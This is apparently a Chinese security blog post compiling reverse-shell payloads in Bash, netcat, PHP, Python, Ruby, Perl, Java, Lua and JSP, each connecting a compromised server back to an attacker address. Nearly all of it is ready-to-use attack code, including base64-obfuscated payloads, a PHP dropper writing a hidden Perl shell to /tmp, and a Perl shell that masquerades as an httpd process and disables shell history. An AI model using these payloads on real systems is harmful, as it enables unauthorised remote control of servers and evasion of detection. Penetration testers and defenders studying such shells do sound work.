---
title: 反弹Shell
date: 2017-12-09 23:53:55
categories: web
tags: shell
---

假设攻击端为10.0.0.1，接收端口为8080

服务器端为10.0.0.2

### 1、Bash

关于bash中的重定向知识，可以参考[shell之后的操作](/2018/04/10/shell之后的操作/)

服务器端：

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```
bash -c 'sh -i &>/dev/tcp/10.0.0.1/8080 0>&1'
```

攻击端：

```
nc -lvvp 8080
```

### 2、NetCat

服务器端

```
nc -e /bin/sh 10.0.0.1 8080
nc -e /bin/sh 10.0.0.1 8080
```

现在的很多/bin/nc -> /etc/alternatives/nc -> /bin/nc.openbsd

但是实际上这个nc.openbsd不支持nc -e命令

所以我们最好使用的是/bin/nc.traditional

```
/bin/nc.traditional -e /bin/sh 10.0.0.1 8080
```

当然若没有/bin/nc.traditional这个nc传统版，我们也可以使用下面的方法：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
```
```
本地监听两个端口,通过管道,一处输入,一处输出
nc 10.0.0.1 2333|/bin/sh|nc 10.0.0.1 2444
```
![img](/images/2017-12-10/43-300x71.png)
```
mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.0.0.1 8080 1>/tmp/backpipe
```
```
将nc替换成telnet
mknod backpipe p && telnet 10.0.0.1 8080 0<backpipe | /bin/bash 1>backpipe
```

### 3、PHP

```
php -r '$sock=fsockopen("10.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

不知道怎么回事，这个反弹的shell并不能用。代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6。当然推荐使用下面的：

```
php -r 'set_time_limit(0);$a="1.0";$b="10.0.0.1";$c=8080;$d=1400;$e=null;$f=null;$g="uname -a; w; id; /bin/sh -i";$h=0;$i=0;if(function_exists("pcntl_fork")){$j=pcntl_fork();if($j==-1){printit("ERROR: Can not fork");exit(1);}if($j){exit(0);}if(posix_setsid()==-1){printit("Error: Can not setsid()");exit(1);}$h=1;}else{printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}chdir("/");umask(0);$k=fsockopen($b,$c,$l,$m,30);if(!$k){printit("$m ($l)");exit(1);}$n=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$o=proc_open($g,$n,$p);if(!is_resource($o)){printit("ERROR: Can not spawn shell");exit(1);}stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($k,0);printit("Successfully opened reverse shell to $b:$c");while(1){if(feof($k)){printit("ERROR: Shell connection terminated");break;}if(feof($p[1])){printit("ERROR: Shell process terminated");break;}$q=array($k,$p[1],$p[2]);$r=stream_select($q,$e,$f,null);if(in_array($k,$q)){if($i)printit("SOCK READ");$s=fread($k,$d);if($i)printit("SOCK: $s");fwrite($p[0],$s);}if(in_array($p[1],$q)){if($i)printit("STDOUT READ");$s=fread($p[1],$d);if($i)printit("STDOUT: $s");fwrite($k,$s);}if(in_array($p[2],$q)){if($i)printit("STDERR READ");$s=fread($p[2],$d);if($i)printit("STDERR: $s");fwrite($k,$s);}}fclose($k);fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($o);function printit($t){if(!$h){print"$t\n";}}'
```

或者

```
php -r 'function which($a){$b=execute("which $a");return($b?$b:$a);}function execute($c){$d="";if($c){if(function_exists("exec")){@exec($c,$d);$d=join("\n",$d);}elseif(function_exists("shell_exec")){$d=@shell_exec($c);}elseif(function_exists("system")){@ob_start();@system($c);$d=@ob_get_contents();@ob_end_clean();}elseif(function_exists("passthru")){@ob_start();@passthru($c);$d=@ob_get_contents();@ob_end_clean();}elseif(@is_resource($e=@popen($c,"r"))){$d="";while(!@feof($e)){$d.=@fread($e,1024);}@pclose($e);}}return $d;}function cf($g,$h){if($i=@fopen($g,"w")){@fputs($i,@base64_decode($h));@fclose($i);}}$j="10.0.0.1";$k="8080";$l=array("perl"=>"perl","c"=>"c");$m="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"."hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"."sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"."kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"."KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"."OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";cf("/tmp/.bc",$m);$d=execute(which("perl")." /tmp/.bc $j $k &");'
```

### 4、Python

以python2.7为例

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
python -c "exec(\"import socket, subprocess;s =socket.socket();s.connect(('10.0.0.1',8080))\nwhile 1: proc =subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

```
若将
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",8080))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
base64加密后生成另外的shell

python -c 'import base64;exec(base64.b64decode("aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTAuMC4wLjEnLDgwODApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KDQwOTYpCndoaWxlIGxlbihkKSE9bDoKCWQrPXMucmVjdig0MDk2KQpleGVjKGQseydzJzpzfSkK"))'
```

### 5、Ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

不依赖于/bin/sh的

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

windows环境下

```
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

```

MSF中的相应的反弹shell代码

```ruby
#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "192.168.1.10" 
#Set the Remote Host Port
PORT = "6667"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end
```

### 6、Perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

一个不依赖调用/bin/bash的方法

```
perl -MIO -e 'use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

完整的perl反弹shell脚本

```perl
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";
# Where to send the reverse shell. Change these.
my $ip = 'x.x.x.x';
my $port = 2333;
# Options
my $daemon = 1;
my $auth = 0; # 0 means authentication is disabled and any
# source IP can access the reverse shell
my $authorised_client_pattern = qr(/^127\.0\.0\.1$/);
# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";
# Change the process name to be less conspicious
$0 = "[httpd]";
# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
    cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");
    if ($auth) {
        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
        cgiprint("ERROR: Your client isn't authorised to view this page");
        cgiexit();
    }
}
} elsif ($auth) {
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access");
    cgiexit(0);
}
# Background and dissociate from parent process if required
if ($daemon) {
    my $pid = fork();
    if ($pid) {
        cgiexit(0); # parent exits
    }
    setsid();
    chdir('/');
    umask(0);
}
# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
} else {
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();
}
# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));
# Wrapper around print
sub cgiprint {
    my $line = shift;
    $line .= "&lt;p&gt;\n";
    $global_page .= $line;
}
# Wrapper around exit
sub cgiexit {
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
    print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}
```

```perl
perl -e 'use strict;use Socket;use FileHandle;use POSIX;my $VERSION = "1.0";my $ip = "10.0.0.1";my $port = 8080;my $daemon = 1;my $auth = 0; my $authorised_client_pattern = qr(/^127\.0\.0\.1$/);my $global_page = "";my $fake_process_name = "/usr/sbin/apache";$0 = "[httpd]";if (defined($ENV{"REMOTE_ADDR"})) {cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");if ($auth) {unless ($ENV{"REMOTE_ADDR"} =~ $authorised_client_pattern) {cgiprint("ERROR: Your client is not authorised to view this page");cgiexit();}}} elsif ($auth) {cgiprint("ERROR: Authentication is enabled, but I could not determine your IP address. Denying access");cgiexit(0);}if ($daemon) {my $pid = fork();if ($pid) {cgiexit(0);}setsid();chdir("/");umask(0);}socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp"));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {cgiprint("Sent reverse shell to $ip:$port");cgiprintpage();} else {cgiprint("Could not open reverse shell to $ip:$port: $!");cgiexit();}open(STDIN, ">&SOCK");open(STDOUT,">&SOCK");open(STDERR,">&SOCK");$ENV{"HISTFILE"} = "/dev/null";system("w;uname -a;id;pwd");exec({"/bin/sh"} ($fake_process_name, "-i"));sub cgiprint {my $line = shift;$line .= "<p>\n";$global_page .= $line;}sub cgiexit {cgiprintpage();exit 0;}sub cgiprintpage {print "Content-Length: " . length($global_page) . "\r\nConnection: close\r\nContent-Type: text\/html\r\n\r\n" . $global_page;}'
```

### 7、Java

ReverseShell.java

```java
public class ReverseShell
{
    public static void main(String[] args){
        try{
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do $line 2>&5 >&5; done"});
            p.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

值得一提的是，由于java并不是脚本式语言，所以并不支持直接运行一行程序！所以需要进行的操作是：

> 先将上述内容复制到一个文件中，以ReverseShell.java命名(必须是这个名字，类和文件名要一致)；
>
> 然后运行javac ReverseShell.java生成ReverseShell.class字节码文件。（这个操作需要javac，该命令依赖jdk）
>
> 最后执行java ReverseShell（执行过程中不用加后缀，java命令依赖于jre，最好将其放置在后台运行。即加上&或者nohup）

下面提供一个相对较为完整的Applet程序，其应该在网页中运行的，但是为了测试简单，我们直接在其中加入了main函数，所以有点像一个单独的程序一样。

```
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.util.regex.*;
import java.applet.Applet;

public class poc extends Applet{
    /**
     * Author: daniel baier alias duddits
     * Licens: GPL
     * Requirements: JRE 1.5 for running and the JDK 1.5 for compiling or higher
     * Version: 0.1 alpha release
     */

    public String cd(String start, File currentDir) {
        File fullPath = new File(currentDir.getAbsolutePath());
        String sparent = fullPath.getAbsoluteFile().toString();
        return sparent + "/" + start;

        }

    @SuppressWarnings("unchecked")
    public void init() {
        poc rs = new poc();
        PrintWriter out;
        try {
            Socket clientSocket = new Socket("10.0.0.1",8080);
            out = new PrintWriter(clientSocket.getOutputStream(), true);
            out.println("\tJRS 0.1 alpha release\n\tdeveloped by duddits alias daniel baier");
            boolean run = true;
            String s;
            BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            String startort = "/";
            while (run) {
                String z1;
                File f = new File(startort);
                out.println(f.getAbsolutePath() + "> ");
                s = br.readLine();
                z1 = s;
                Pattern pcd = Pattern.compile("^cd\\s");
                Matcher mcd = pcd.matcher(z1);
                String[] teile1 = pcd.split(z1);
                if (s.equals("exit")) {
                    run = false;
                }else if (s.equals(null) || s.equals("cmd") || s.equals("")) {

                } else if(mcd.find()){
                    try {
                        String cds = rs.cd(teile1[1], new File(startort));
                        startort = cds;
                        } catch (Exception verz) {
                        out.println("Path " + teile1[1]
                        + " not found.");
                        }

                }else {

                    String z2;


                    z2 = s;
                    Pattern pstring = Pattern.compile("\\s");
                    String[] plist = pstring.split(z2);

                    try {

                        LinkedList slist = new LinkedList();
                        for (int i = 0; i < plist.length; i++) {
                            slist.add(plist[i]);
                        }

                        ProcessBuilder builder = new ProcessBuilder(slist);
                        builder.directory(new File(startort));
                        Process p = builder.start();
                        Scanner se = new Scanner(p.getInputStream());
                        if (!se.hasNext()) {
                            Scanner sa = new Scanner(p.getErrorStream());
                            while (sa.hasNext()) {
                                out.println(sa.nextLine());
                            }
                        }
                        while (se.hasNext()) {
                            out.println(se.nextLine());
                        }


                    } catch (Exception err) {
                        out.println(f.getAbsolutePath() + "> Command "
                                + s + " failed!");
                        out.println(f.getAbsolutePath() +"> Please try cmd /c "+ s+" or bash -c " +s+" if this command is an shell buildin.");
                    }

                }
            }

            if(!clientSocket.isConnected()){
                run = false;
                out.flush();
                out.close();
            }

        } catch (Exception io) {
            //System.err.println("Connection refused by peer");
        }
    }

    public static void main(String[] args){
        poc p = new poc();
        p.init();
    }
}
```

> 运行此程序之前，应该更改环境变量的设置
>
> ```
> export DISPLAY=:0.0
> 或者
> setenv DISPLAY :0.0
> ```

### 8、Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

不建议安装最新的lua，因为会出现以下问题

```
lua: (command line):1: module 'socket' not found:
	no field package.preload['socket']
	no file '/usr/local/share/lua/5.2/socket.lua'
```

这个时候，你应该查看一下服务器上的/usr/local/share/lua下的目录到底是5.1还是5.2，根据其版本，安装正确的lua

### 9、Jsp

```
使用
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 R > re.jsp
```

reverse_shell.jsp

```jsp
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream zd;
    OutputStream fm;

    StreamConnector( InputStream zd, OutputStream fm )
    {
      this.zd = zd;
      this.fm = fm;
    }

    public void run()
    {
      BufferedReader fr  = null;
      BufferedWriter ctw = null;
      try
      {
        fr  = new BufferedReader( new InputStreamReader( this.zd ) );
        ctw = new BufferedWriter( new OutputStreamWriter( this.fm ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = fr.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ctw.write( buffer, 0, length );
          ctw.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( fr != null )
          fr.close();
        if( ctw != null )
          ctw.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.0.0.1", 8080 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
```

### 10、正向shell（nc为例）

服务器端

```
nc -lvvp 7777 -e /bin/bash
```

攻击端

```
nc 10.0.0.2 7777
```



最后要说的是xterm，这是一个session，可以维持；而由于服务器上和本地都得装相应的程序，所以起来较为麻烦！